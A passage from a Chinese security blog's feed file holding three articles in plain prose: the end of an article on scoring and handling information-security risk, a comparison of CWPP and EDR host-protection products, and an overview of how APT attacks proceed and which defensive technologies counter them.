tr><td>4</td><td>H（高）</td><td>威胁发生的可能性较高，在大多数情况下很有可能会发生或者可以证实曾发生过。</td></tr><tr><td>3</td><td>M（中）</td><td>威胁发生的可能性中等，在某种情况下可能会发生但未被证实发生过。</td></tr><tr><td>2</td><td>L（低）</td><td>威胁发生的可能性较小，一般不太可能发生，也没有被证实发生过。</td></tr><tr><td>1</td><td>VL（很低）</td><td>威胁几乎不可能发生，仅可能在非常罕见和例外的情况下发生。</td></tr></tbody></table><h3 id="3、确定脆弱性"><a href="#3、确定脆弱性" class="headerlink" title="3、确定脆弱性"></a>3、确定脆弱性</h3><p>脆弱性是指评估对象存在一个或多个脆弱的管理、技术、业务方面的漏洞，这些漏洞可能会被威胁所利用。脆弱性依据经验或专家意见进行赋值，常用准则参照如下表。采用相对等级的方式进行度量，等级值为1-3，1为最低，3为最高。<br>表：脆弱性赋值准则</p><table><thead><tr><th>类别</th><th>描述</th><th>对应等级</th></tr></thead><tbody><tr><td>技术保障</td><td>技术方面是否存在低等级缺陷，从技术角度是否易被利用。</td><td>3</td></tr><tr><td>攻击利用</td><td>对于攻击者来说，该漏洞目前是否能被直接或者间接利用，或者利用的难度。</td><td>3</td></tr><tr><td>管理控制</td><td>运营管理环节是否有相关的薄弱环节，被利用难易程度。</td><td>3</td></tr><tr><td>防范控制</td><td>是否有规定，是否严格审核、是否有记录校验等。</td><td>2</td></tr></tbody></table><p>脆弱性等级</p><table><thead><tr><th>等级</th><th>标识</th><th>定义</th></tr></thead><tbody><tr><td>3</td><td>H（高）</td><td>如果被威胁利用，将造成完全损害。</td></tr><tr><td>2</td><td>M（中）</td><td>如果被威胁利用，将造成一般损害。</td></tr><tr><td>1</td><td>L（低）</td><td>如果被威胁利用，造成的损害可以忽略。</td></tr></tbody></table><h3 id="4、计算风险值"><a href="#4、计算风险值" class="headerlink" title="4、计算风险值"></a>4、计算风险值</h3><p>风险计算公式：</p><blockquote><p>风险值=影响范围 * 威胁可能性 * 脆弱严重性</p></blockquote><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220419/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E5%BD%A9%E8%99%B9%E5%9B%BE.png" alt="风险评估彩虹图"></p><p>根据风险计算公式得出风险值后可以对应其风险等级，如风险值在55-75分，表示风险极高</p><h3 id="5、评估结论"><a href="#5、评估结论" class="headerlink" title="5、评估结论"></a>5、评估结论</h3><p>评估报告以风险计算得分形式呈现，即：不仅呈现脆弱性问题，并且对于不符合评估标准的项，根据面临威胁赋值和脆弱性赋值，结合评估对象的影响范围计算出风险得分，依据得分给出风险等级（极高、高、中、低、极低）。 任一评估要点匹配对应的企业安全保障能力的脆弱性测算值＞0时，须及时记录并反馈至本级信息安全部门进行报备。任一评估要点的风险值的对应等级为中及其以上程度时，必须纳入整改事项严格贯彻执行，并密切跟踪把握风险变化、持续健全更新与之匹配对应的信息安全管理措施和技术保障手段，根据业务上线后的经营发展情况适时开展安全评估，以确保将信息安全风险控制在中级以下范围内。评估管理部门应组织评估专家审查小组，对“评估结论”进行审核，通过后出具评审结论。</p><h2 id="三、为什么要管理安全风险"><a href="#三、为什么要管理安全风险" class="headerlink" title="三、为什么要管理安全风险"></a>三、为什么要管理安全风险</h2><p>风险管理的目的是确保不确定性不会使企业的业务目标发生变化。风险管理是风险的识别、评估和优化，然后协调和经济地应用资源，以最小化监测和控制不良事件的可能性及影响，最大限度地实现业务。</p><p>风险管理可使信息系统的主管者和运营者在安全措施的成本与资产价值之间寻求平衡，并最终通过对支持其使命的信息系统及数据进行保护而提高其实现使命的能力。</p><p>一个单位的领导必须确保本单位具备完成其使命所需的能力。信息安全措施是有成本的，因此对信息安全的成本必须像其他管理决策一样进行全面检查。一套合理的风险管理方法，可以帮助信息系统的主管者和运营者最大程度地提高其信息安全保障能力，以有效实现其使命。</p><h2 id="四、如何管理安全风险"><a href="#四、如何管理安全风险" class="headerlink" title="四、如何管理安全风险"></a>四、如何管理安全风险</h2><p>信息安全风险管理包括背景建立、风险评估、风险处理、批准监督、监控审查和沟通咨询6个方面的内容。<strong>背景建立、风险评估、风险处理和批准监督</strong>是信息安全风险管理的4个基本步骤，监控审查和沟通咨询则贯穿于这4个基本步骤中，如下图所示。</p><h3 id="1、背景建立"><a href="#1、背景建立" class="headerlink" title="1、背景建立"></a>1、背景建立</h3><p>背景建立是信息安全风险管理的第一个步骤，是为了明确信息安全风险管理的范围和对象，以及对象的特性和安全要求，对信息安全风险管理项目进行规划和准备，保障后续的风险管理活动顺利进行。背景是建立在业务需求的基础上，通过有效的风险评估和国家、地区、行业相关法律法规及标准的约束下获得背景依据。<br>背景建立的过程包括风险管理准备、信息系统调查、信息系统分析和信息安全分析4个阶段。在信息安全风险管理过程中，对象确立过程是一次信息安全风险管理主循环的起始，为风险评估提供输人。</p><h3 id="2、风险评估"><a href="#2、风险评估" class="headerlink" title="2、风险评估"></a>2、风险评估</h3><p>风险评估确定信息资产的价值、识别适用的威胁和(存在或可能存在的)脆弱点、识别现有控制措施及其对已识别风险的影响，确定潜在后果,对风险进行最终的优先级排序，并按照风险范畴中设定的风险评价准则进行排名。<br>风险评估的目的是通过风险评估的结果，来获得信息安全需求，信息安全风险管理要依靠风险评估的结果来确定随后的风险处理和批准监督活动。风险评估使得组织能够准确定位风险管理的策略、实践和工具，能够将安全活动的重点放在重要的问题上，能够选择有合理成本效益的和适用的安全对策。基于风险评估的风险管理方法被实践证明是有效的和实用的，已被广泛应用于各个领域。<br>风险评估的过程包括风险评估准备、风险要素识别、风险分析和风险结果判定4个阶段。在信息安全风险管理过程中，风险评估活动接受背景建立阶段的输出，形成本阶段的最终输出《风险评估报告》，此文档为风险处理活动提供输人。</p><h3 id="3、风险处理"><a href="#3、风险处理" class="headerlink" title="3、风险处理"></a>3、风险处理</h3><p>风险处理是依据风险评估的结果，选择和实施合适的安全措施。风险处理的目的是为了将风险始终控制在可接受的范围内。风险处理的方式主要有降低、规避、转移和接受4种方式。</p><ul><li><p>降低方式:<br>组织首先应该选择降低风险，通常通过对面临风险的资产采取保护措施来降低风险。保护措施可以从构成风险的5个方面( 即威胁源、威胁行为、脆弱性、资产和影响)来降低风险。比如，采用法律的手段制裁计算机犯罪(包括窃取机密信息，攻击关键的信息系统基础设施，传播病毒、不健康信息和垃圾邮件等)，发挥法律的威慑作用，从而有效遏制威胁源的动机;采取身份认证措施，从而抵制身份假冒这种威胁行为的能力；及时给系统打补丁(特别是针对安全漏洞的补丁)，关闭无用的网络服务端口，从而减少系统的脆弱性，降低被利用的可能性；采用各种防护措施，建立资产的安全域，从而保证资产不受侵犯，其价值得到保持；采取容灾备份、应急响应和业务连续计划等措施，从而减少安全事件造成的影响程度。</p></li><li><p>规避方式:<br>当风险不能被降低时，通过不使用面临风险的资产来避免风险。比如，在没有足够安全保障的信息系统中，不处理特别敏感的信息，从而防止敏感信息的泄漏。再如，对于只处理内部业务的信息系统，不使用互联网，从而避免外部的有害人侵和不良攻击。</p></li><li><p>转移方式:<br>只有在风险既不能被降低，又不能被规避时，通过将面临风险的资产或其价值转移到更安全的地方来避免或降低风险。比如，在本机构不具备足够的安全保障的技术能力时，将信息系统的技术体系(即信息载体部分)外包给满足安全保障要求的第三方机构，从而避免技术风险。再如，通过给昂贵的设备上保险，将设备损失的风险转移给保险公司，从而降低资产价值的损失。</p></li><li><p>接受方式:<br>是选择对风险不采取进一步的处理措施，接受风险可能带来的结果。接受风险的前提是确定了风险的等级，评估了风险发生的可能性以及带来的潜在破坏，分析了使用每种处理措施的可行性，并进行了较全面的成本效益分析，认定某些功能、服务、信息或资产不需要进一 步保护。</p></li></ul><p>风险处理的过程包括现存风险判断、处理目标确立、处理措施选择和处理措施实施4个阶段。</p><h3 id="4、批准监督"><a href="#4、批准监督" class="headerlink" title="4、批准监督"></a>4、批准监督</h3><p>批准监督包括批准和持续监督两部分。<br>批准，是指机构的决策层依据风险评估和风险处理的结果是否满足信息系统的安全要求，做出是否认可风险管理活动的决定。批准应由机构内部或更高层的主管机构的决策层来执行。<br>持续监督，是指检查机构及其信息系统以及信息安全相关的环境有无变化，监督变化因素是否有可能引入新的安全隐患并影响到信息系统的安全保障级别。监督通常由机构内部管理层和执行层完成，必要时也可以委托支持层的外部专业机构提供支持，这主要取决于信息系统的性质和机构自身的专业能力。<br>对风险评估和风险处理的结果的批准和持续监督，不能仅依据相关标准进行僵化的对比，而是需要紧紧围绕信息系统所承载的业务，通过对业务的重要性和业务遭受损失后所带来的影响来开展相关工作。批准通过的依据( 原则)有两个：一是信息系统的残余风险是可接受的；二是安全措施能够满足信息系统当前业务的安全需求。</p><p>参考资料：<br>《CISP培训教材》<br>《信息安全工程师教程（第2版）》<br>《信息安全技术信息安全风险评估规范》</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CWPP与EDR的定义与区别</title>
      <link href="/posts/ada9f957/"/>
      <url>/posts/ada9f957/</url>
      
        <content type="html"><![CDATA[<p>随着信息系统的发展，大家都在说网络安全要覆盖“云”、“管”、“端”，CWPP与EDR是目前非常火的产品，一个面向云端服务器的防护，一个是面向常规终端PC端的防护。</p><p>在介绍CWPP与EDR两个产品概念之前，先来简单说明一下主机、服务器、终端几个位置概念：</p><p>主机VS服务器。主机是一个统称，所有服务器（虚拟机）都是主机，但并非所有主机都是服务器，也就是主机覆盖服务器。主机和服务器的主要差别在于，主机是连接到网络的计算机或其他设备，而服务器是提供服务的软件或硬件设备，日常所说的服务器一般是指提供服务的主机。由此可见，主机安全并不是一个产品，而是对应一个需要被保护的位置，主机安全即主机侧的安全保护。</p><p>终端VS服务器。终端和服务器是两类东西。这里的终端指桌面电脑、笔记本、个人设备等用于访问网络、数据和应用的设备，而服务器则是提供服务、存储、计算的设备。当然，某种程度上来说，广义上的终端概念也可以包括服务器，但常规意义的终端不包括服务器。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220416/%E7%BB%88%E7%AB%AF%E5%92%8C%E4%B8%BB%E6%9C%BA.png" alt="终端主机"></p><p>对于一般的应用系统来说，服务器就是提供服务的主机如提供WEB、FTP、数据库等服务的服务器，终端就是访问服务的工作站、个人PC等。</p><h2 id="一、CWPP的定义"><a href="#一、CWPP的定义" class="headerlink" title="一、CWPP的定义"></a>一、CWPP的定义</h2><p> 现代数据中心支持运行在物理设备、虚拟机（VM）、容器以及私有云基础架构中的各种工作负载，并且几乎总是涉及一些在一个或多个公有云基础设施即服务（IaaS）提供商中运行的工作负载。<br><strong>云工作保护平台(Cloud Workload Protection Platform)简称CWPP</strong>，市场定义为基于主机的解决方案，主要满足现代混合数据中心架构中，服务器工作负载的保护要求。它为信息安全领导者提供了一种集成的方式，通过使用单个管理控制台和单一方式表达安全策略来保护这些工作负载，而不用考虑工作负载运行的位置。<br>可以理解成为基于代理（Agent）的底层技术方案，和传统部署在网络边界上的安全产品不一样，CWPP部署在操作系统层，因此可以横跨物理机、公有云、私有云、混合云等多种数据中心环境，部署方式更加灵活、防护层面更加丰富。采用服务端agent+远程控制台的部署模式，agent支持云、物理、混合环境部署，能有效安全加固服务器、抵御黑客攻击和恶意代码。</p><p>Gartner定义的产品能力(需求)的金子塔说明了对CWPP产品能力的定义，越是靠近基座的功能越重要，越是靠近塔尖的功能越次要。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220416/CWPP.png" alt="CWPP"></p><p>CWPP的核心能力：</p><ul><li>Congurationand  vulnerability management 配置和漏洞管理<br>1.配置，即服务器优化，通过对操作系统进行合理配置，提升操作系统的安全性和抗攻击能力。<br>2.漏洞管理，分为操作系统漏洞管理和应用漏洞管理。目前网络攻击主要是通过web服务器或者web应用漏洞发起，因此CWPP产品要能提供标准化、同时支持制定自定义的web应用漏洞防护策略。</li><li>Networksegmentation, isolation and traffic visibility 网络隔离与流可视<br>要求CWPP产品首先能图形化管理用户的主机业务资产，并且可以跨物理、虚拟架构、网络定于基于角色的访问策略（微隔离）；对于主机之间的访问关系，可以图形化的展示和控制（流可视化）。</li><li>Systemintegrity measurement， attestation and monitoring 系统完整性检测、认证和监测<br>可以保护系统文件或者指定目录、文件不被恶意修改，提供监控模式和防护模式。</li><li>Application control应用防护<br>CWPP产品需要能识别到主机上运行的应用，并对不同的应用提供相应的防护策略，如云锁对web应用提供waf防护，对于sshd、remotedesktop提供防暴力破解防护等。</li><li>Capabilities that augment/verify foundational operational controls 增强及验证基础运维能力<br>CWPP产品要求不能单纯依靠服务器账号、密码来验证管理员，而需要引入账号密码外的第二套验证机制。比如云锁的登陆防护功能，可以限制登陆服务的用户名、IP范围、登陆时间、登陆服务器使用的PC名称，如果不满足限制条件，即使拿到服务器的管理员账号密码也无法登陆服务器。</li><li>Log management and monitoring日志管理和监测<br>要求CWPP产品能提供完整的日志，同时当安全事件发生后，CWPP产品需要关联相关日志最终形成事件IOC，帮助用户回溯攻击过程，快速定位风险点。</li></ul><h2 id="二、EDR的定义"><a href="#二、EDR的定义" class="headerlink" title="二、EDR的定义"></a>二、EDR的定义</h2><p>根据Gartner的定义，<strong>EDR端点检测与响应（Endpoint Detection and Response）简称EDR</strong>是一种集成的终端安全解决方案，它将终端数据的实时连续监控和收集与基于规则的自动响应和分析功能相结合。该术语由Gartner的Anton Chuvakin提出，用于描述新兴的安全系统，用于检测和调查终端上的可疑活动，采用高度自动化使安全团队能够快速识别和响应威胁。完全不同于以往的端点被动防护思路，而是通过云端威胁情报、机器学习、异常行为分析、攻击指示器等方式，主动发现来自外部或内部的安全威胁，并进行自动化的阻止、取证、补救和溯源，从而有效对端点进行防护。</p><p>相比于传统端点安全防护采用预设安全策略的静态防御技术，EDR加强了威胁检测和响应取证能力，能够快速检测、识别、监控和处理端点事件，从而在威胁尚未造成危害前进行检测和阻止，帮助受保护网络免受零日威胁和各种新出现的威胁。安全模型如图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220416/EDR.png" alt="EDR"></p><ul><li>资产发现：定期通过主动扫描、被动发现、手工录入和人工排查等多种方法收集当前网络中所有软硬件资产，包括全网所有的端点资产和在用的软件名称、版本，确保整个网络中没有安全盲点。</li><li>系统加固：定期进行漏洞扫描、补丁修复、安全策略设置和更新端点软件清单，通过软件白名单限制未经授权的软件运行，通过主机防火墙限制未经授权的服务端口开放，并定期检查和清理内部人员的账号和授权信息。</li><li>威胁检测：通过端点本地的主机入侵检测和借助云端威胁情报、异常行为分析、攻击指示器等方式，针对各类安全威胁，在其发生前、发生中、发生后进行相应的安全检测动作。</li><li>响应取证：针对全网的安全威胁进行可视化展示，能够针对安全威胁自动化地进行隔离、修复和补救，自动完成安全威胁的调查、分析和取证工作，降低事件响应和取证分析的技术门槛，不需要依赖于外部专家即可完成快速响应和取证分析。</li></ul><h2 id="三、CWPP与EDR的关系与区别"><a href="#三、CWPP与EDR的关系与区别" class="headerlink" title="三、CWPP与EDR的关系与区别"></a>三、CWPP与EDR的关系与区别</h2><p>EDR与CWPP主机安全属于网络安全领域两个不同的方向，前者聚焦于常规的终端侧，后者聚焦于主机侧，两者作用于完全不同的位置。EDR的基因是根植于PC等常规终端的，它天然不适配于主机侧。</p><table><thead><tr><th>需求场景</th><th>需求求相同点</th><th>需求不同点</th></tr></thead><tbody><tr><td>终端侧安全</td><td>资产梳理清点<br>统一集中管理<br>风险防护</td><td>安全需求&gt;稳定需求，注重安全防护能力，重防御；<br>关注用户实体行为分析（UEBA），防止PC端成为威胁内网安全的导火索，防止敏感数据歪斜；<br>高危动作或安全风险尽可能自动化完成阻断动作，无需人工介入，确保整体网络的安全可靠。</td></tr><tr><td>主机侧安全</td><td>资产梳理清点<br>统一集中管理<br>风险防护</td><td>稳定需求&gt;安全需求，注重安全检测能力，重检测；<br>更加关注主机上承载的业务应用和数据安全；<br>因业务连续性需要，安全加固工作需人工介入，要在确保业务连续稳定运行的基础上进行加固。</td></tr></tbody></table><p>在安全的需求上，PC类的终端侧与主机侧的安全诉求差别很大。所以，面向终端的EDR产品与面向服务器/工作负载的主机安全产品CWPP，这两者之间有本质的区别，并不能混为一谈。主机侧的安全产品实现不了终端侧的安全防护，EDR也不能实现CWPP的防护效果。<br>两种产品的区别如下：</p><table><thead><tr><th>对比项</th><th>CWPP</th><th>EDR</th></tr></thead><tbody><tr><td>产品定位</td><td>主机安全防护</td><td>终端安全防护</td></tr><tr><td>产品部署</td><td>Agent不在内核安装驱动，稳定性高</td><td>Agent安装需要在内核安装驱动，稳定性差，影响业务</td></tr><tr><td>资产清点</td><td>资产清点能力更全面，支持对业务层资产精准识别和动态感知</td><td>资产信息相对比较少，不够全面</td></tr><tr><td>风险发现</td><td>提供全面的风险检查，包括漏洞风险、弱密码、系统风险、应用风险、账号风险检查</td><td>支持漏洞风险检查，不具备其他风险检查能力</td></tr><tr><td>入侵检测与病毒查杀</td><td>不依赖特征库的检测方式，基于行为以及结合威胁情报、大数据、机器学习等方法，提供实时精准的入侵检测和响应能力</td><td>主要功能是病毒查杀，基于特征库或结合威胁情报，能够查杀绝大部分病毒，但仍属于被动防护</td></tr><tr><td>基线合规检查</td><td>提供等保或CIS国标标准的检查基线，支持对系统、应用、数据进行基线合规检查</td><td>通常不具备合基线合规检查能力，或提供少量的基线检查标准。</td></tr></tbody></table><p>CWPP与EDR，一个面向服务器端的防护（CWPP），一个是面向常规终端PC端的防护（EDR）但是对于企业的整体安全防护来说，CWPP和EDR相互作为补充构建企业的云、端防护能力。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络信息安全之APT攻击</title>
      <link href="/posts/25e5f55a/"/>
      <url>/posts/25e5f55a/</url>
      
        <content type="html"><![CDATA[<h1 id="一、什么是APT攻击"><a href="#一、什么是APT攻击" class="headerlink" title="一、什么是APT攻击"></a>一、什么是APT攻击</h1><p>当今，网络系统面临着越来越严重的安全挑战，在众多的安全挑战中，一种具有组织性、特定目标以及长时间持续性的新型网络攻击日益猖獗，国际上常称之为<strong>APT（Advanced Persistent Threat高级持续性威胁）攻击</strong>。<br>APT攻击是一种以商业或者政治目的为前提的特定攻击，其通过一系列具有针对性的攻击行为以获取某个组织甚至国家的重要信息，特别是针对国家重要的基础设施和单位开展攻击，包括能源、电力、金融、国防等等。APT攻击常常采用多种攻击技术手段，包括一些最为先进的手段和社会工程学方法，并通过长时间持续性的网络渗透，一步步的获取内部网络权限，此后便长期潜伏在内部网络，不断地收集各种信息，直至窃取到重要情报。<br>对于APT攻击比较权威的定义是由美国国家标准与技术研究所( NIST)提出的，该定义给出了APT攻击的4个要素，具体如下。<br>(1)攻击者：拥有高水平专业知识和丰富资源的敌对方。<br>(2)攻击目的：破坏某组织的关键设施，或阻碍某项任务的正常进行。<br>(3)攻击手段：利用多种攻击方式，通过在目标基础设施上建立并扩展立足点来获取信息。<br>(4)攻击过程：在一个很长的时间段内潜伏并反复对目标进行攻击,同时适应安全系统的防御措施,通过保持高水平的交互来达到攻击目的。</p><h1 id="二、APT攻击过程"><a href="#二、APT攻击过程" class="headerlink" title="二、APT攻击过程"></a>二、APT攻击过程</h1><p>一般APT攻击过程可概括为3个阶段：<strong>攻击前准备</strong>阶段、<strong>攻击入侵</strong>阶段和<strong>持续攻击</strong>阶段，又可细分为5个步骤：<strong>情报收集、防线突破、通道建立、横向渗透、信息收集及外传</strong>。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220402/APT%E6%94%BB%E5%87%BB%E8%BF%87%E7%A8%8B.png" alt="APT攻击过程"></p><h2 id="1-情报收集"><a href="#1-情报收集" class="headerlink" title="1.情报收集"></a>1.情报收集</h2><p>在实施攻击之前，攻击者会针对特定组织的网络系统和相关员工展开大量的信息搜集。信息搜集方法多种多样，通常包括搜索引擎、爬网系统、网络隐蔽扫描、社会工程学方法等方式。信息来源包括相关员工的微博、博客、社交网站、公司网站，甚至通过某些渠道购买相关信息(如公司通讯录等)。攻击者通过对这些信息的分析，可以清晰地了解攻击目标所使用的应用、防御软件，组织内部架构和人员关系，核心资产存放情况等等。于是，攻击者针对特定目标(一般是内部员工)所使用的应用软件寻找漏洞，并结合特定目标所使用的杀毒软件、防火墙等设计特定木马/恶意代码以绕过防御。同时，攻击者搭建好入侵服务器，开展技术准备工作。</p><h2 id="2-防线突破"><a href="#2-防线突破" class="headerlink" title="2.防线突破"></a>2.防线突破</h2><p>攻击者在完成情报收集和技术准备后，开始采用木马/恶意代码攻击特定员工的个人电脑，攻击方法主要有：①社会工程学方法，如电子邮件攻击，攻击者窃取与特定员工有关系的人员(如领导、同事、朋友等)电子邮箱，冒充发件人给该员工发送带有恶意代码附件的邮件，一旦该员 工打开附件，员工电脑便感染了恶意软件。②远程漏洞攻击方法，如网站挂马攻击，攻击者在员工常访问的网站上放置木马，当员工再次访问该网站时，个人电脑便受到网页代码攻击。由于这些恶意软件针对的是系统未知漏洞并被特殊处理，因此现有的杀毒软件和防火墙均无法察觉，攻击者便能逐渐获取个人电脑权限，最后直至控制个人电脑。</p><h2 id="3-通道建立"><a href="#3-通道建立" class="headerlink" title="3.通道建立"></a>3.通道建立</h2><p>攻击者在突破防线并控制员工电脑后，在员工电脑与入侵服务器之间开始建立命令控制通道。通常，命令控制通道采用HTTP/HTTPS等协议构建，以突破电脑系统防火墙等安全设备。一旦攻击者完成通道建立，攻击者通过发送控制命令检查植入的恶意软件是否遭受查杀，并在恶意软件被安全软件检测到前，对恶意软件进行版本升级，以降低被发现的概率。</p><h2 id="4-横向渗透"><a href="#4-横向渗透" class="headerlink" title="4.横向渗透"></a>4.横向渗透</h2><p>入侵和控制员工个人电脑并不是攻击者的最终目的，攻击者会采用口令窃听、漏洞攻击等多种渗透方法尝试进一步入侵组织内部更多的个人电脑和服务器，同时不断地提升自己的权限，以求控制更多的电脑和服务器，直至获得核心电脑和服务器的控制权。</p><h2 id="5-信息收集及外传"><a href="#5-信息收集及外传" class="headerlink" title="5.信息收集及外传"></a>5.信息收集及外传</h2><p>攻击者常常长期潜伏，并不断实行网络内部横向渗透，通过端口扫描等方式获取服务器或设备上有价值的信息，针对个人电脑通过列表命令等方式获取文档列表信息等。攻击者会将内部某个服务器作为资料暂存的服务器，然后通过整理、压缩、加密、打包的方式，利用建立的隐蔽通信通道将信息进行外传。在获取这些信息后，攻击者会对这些信息数据进行分析识别，并做出最终的判断，甚至实施网络攻击破坏。</p><h1 id="三、APT攻击和传统攻击的区别"><a href="#三、APT攻击和传统攻击的区别" class="headerlink" title="三、APT攻击和传统攻击的区别"></a>三、APT攻击和传统攻击的区别</h1><p>APT攻击具有不同于传统网络攻击的5个显著特征：针对性强、组织严密、持续时间长、高隐蔽性和间接攻击。<br>1.针对性强<br>APT攻击的目标明确，多数为拥有丰富数据/知识产权的目标，所获取的数据通常为商业机密、国家安全数据、知识产权等。<br>相对于传统攻击的盗取个人信息，APT攻击只关注预先指定的目标，所有的攻击方法都只针对特定目标和特定系统，针对性较强。<br>2.组织严密<br>APT攻击成功可带来巨大的商业利益，因此攻击者通常以组织形式存在，由熟练黑客形成团体，分工协作，长期预谋策划后进行攻击。他们在经济和技术上都拥有充足的资源，具备长时间专注APT研究的条件和能力。<br>3.持续时间长<br>APT攻击具有较强的持续性，经过长期的准备与策划，攻击者通常在目标网络中潜伏几个月甚至几年，通过反复渗透，不断改进攻击路径和方法，发动持续攻击，如零日漏洞攻击等。<br>4.高隐蔽性<br>APT攻击根据目标的特点，能绕过目标所在网络的防御系统，极其隐藏地盗取数据或进行破坏。在信息收集阶段，攻击者常利用搜索引擎、高级爬虫和数据泄漏等持续渗透，使被攻击者很难察觉；在攻击阶段，基于对目标嗅探的结果，设计开发极具针对性的木马等恶意软件，绕过目标网络防御系统，隐蔽攻击。<br>5.间接攻击<br>APT攻击不同于传统网络攻击的直接攻击方式，通常利用第三方网站或服务器作跳板，布设恶意程序或木马向目标进行渗透攻击。恶意程序或木马潜伏于目标网络中，可由攻击者在远端进行遥控攻击，也可由被攻击者无意触发启动攻击。</p><table><thead><tr><th>对比内容</th><th>传统攻击</th><th>APT攻击</th></tr></thead><tbody><tr><td>攻击者特征</td><td>个体或小组织网络犯罪分子</td><td>全球性、有组织、有纪律的不法团体、公司、敌对者</td></tr><tr><td>攻击目标</td><td>随机性选择攻击，通常以个体为主，以达到获取金钱、盗窃身份、欺诈等</td><td>特定攻击目标，通常针对国家安全信息、重要行业商业机密信息等</td></tr><tr><td>攻击手段</td><td>攻击手段比较单一，常基于已有的恶意软件展开攻击</td><td>攻击手段复杂，形式多样，结合0day攻击、特种木马攻击、社会工程学等展开攻击</td></tr><tr><td>攻击时间</td><td>攻击时间较短，以一次性、大范围攻击为主</td><td>攻击时间较长，长期潜伏、多次渗透攻击</td></tr><tr><td>攻击痕迹</td><td>攻击特性很强，容易在较短时间内被检测和捕获</td><td>攻击特征弱，比较隐蔽，缺少样本数据，很难被检测和捕获</td></tr></tbody></table><h1 id="四、如何防范APT攻击"><a href="#四、如何防范APT攻击" class="headerlink" title="四、如何防范APT攻击"></a>四、如何防范APT攻击</h1><p>随着人们对APT攻击的研究不断深入，已经出现一些有效的防御技术来对抗APT攻击，其核心思想大多是针对APT“攻击链”的某一步骤展开防御。这些技术主要包括：沙箱技术、信誉技术、异常流量分析技术、大数据分析技术等等。</p><h2 id="1-沙箱技术"><a href="#1-沙箱技术" class="headerlink" title="1.沙箱技术"></a>1.沙箱技术</h2><p>沙箱，又叫做沙盘，被认为是当前防御APT攻击的最有效技术之一。沙箱即是通过虚拟化技术形成一个模拟化的环境，同时将本地系统中的进程对象、内存、注册表等与模拟环境相互隔离，以便在这个虚拟化环境中测试和观察文件、访问等运行行为。沙箱通过重定向技术，将测试过程中生成和修改的文件定向到特定文件夹中，避免了对真是注册表、本地核心数据等的修改。当APT攻击在改虚拟环境发生时，可以及时地观察并分析其特征码，进一步防御其深入攻击。</p><h2 id="2-信誉技术"><a href="#2-信誉技术" class="headerlink" title="2.信誉技术"></a>2.信誉技术</h2><p>安全信誉是对互联网资源和服务相关实体安全可信性的评估和看法。信誉技术是应用于APT攻击检测具有较好辅助功能的一项技术，通过建立信誉库，包括WEB URL信誉库、文件MD5码库、僵尸网络地址库、威胁情报库等，可以为新型病毒、木马等APT攻击的检测提供强有力的技术辅助支撑，实现网络安全设备对不良信誉资源的阻断或过滤。信誉库的充分利用，将进一步提高安全新品的安全防护能力。</p><h2 id="3-主机漏洞防护技术"><a href="#3-主机漏洞防护技术" class="headerlink" title="3.主机漏洞防护技术"></a>3.主机漏洞防护技术</h2><p>针对横向移动与内部资料进行挖掘和探测的防御，可采用主机漏洞防护技术，能侦测任何针对主机漏洞的攻击并加以拦截，进而保护未修补的主机。这类解决方案可实现档案 / 系统一致性监控，保护未套用修补程序的主机，防止已知和0day 漏洞攻击。</p><h2 id="4-异常流量分析技术"><a href="#4-异常流量分析技术" class="headerlink" title="4.异常流量分析技术"></a>4.异常流量分析技术</h2><p>这是一种流量检测及分析技术，其采用旁路接入方式提取流量信息，可以针对帧数、帧长、协议、端口、标识位、IP路由、物理路径、CPU/RAM消耗、宽带占用等进行监测，并基于时间、拓扑、节点等多种统计分析手段，建立流量行为轮廓和学习模型来识别流量异常情况，进而判断并识别0Day漏洞攻击等。</p><h2 id="5-数据防泄漏技术（DLP）"><a href="#5-数据防泄漏技术（DLP）" class="headerlink" title="5.数据防泄漏技术（DLP）"></a>5.数据防泄漏技术（DLP）</h2><p>针对资料外传的风险，一般可采用加密和资料外泄防护 (DLP)技术，将关键、敏感、机密的数据加密，是降低数据外泄风险的一种方法，DLP 可提供一层额外的防护来防止数据外泄。然而，这类工具通常很复杂，而且有些部署条件，例如：数据要分类，要定义政策和规则等。</p><h2 id="6、大数据分析技术"><a href="#6、大数据分析技术" class="headerlink" title="6、大数据分析技术"></a>6、大数据分析技术</h2><p>APT攻击防御离不开大数据分析技术，无论是网络系统本身产生的大量日志数据，还是SOC安管平台产生的大量日志信息，均可以利用大数据分析技术进行大数据再分析，运用数据统计、数据挖掘、关联分析、态势分析等从记录的历史数据中发现APT攻击的痕迹，以弥补传统安全防御技术的不足。</p><p>我们熟知的APT防御产品主要针对的都是APT攻击链上的某个环节来展开防御，目前来说这是远远不够的。APT攻击防御应该是覆盖APT攻击所有环节，未来发展的趋势，是需要构建基于APT攻击链的多层次、多维度、多角度的纵深防御体系，如态势感知平台等。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img 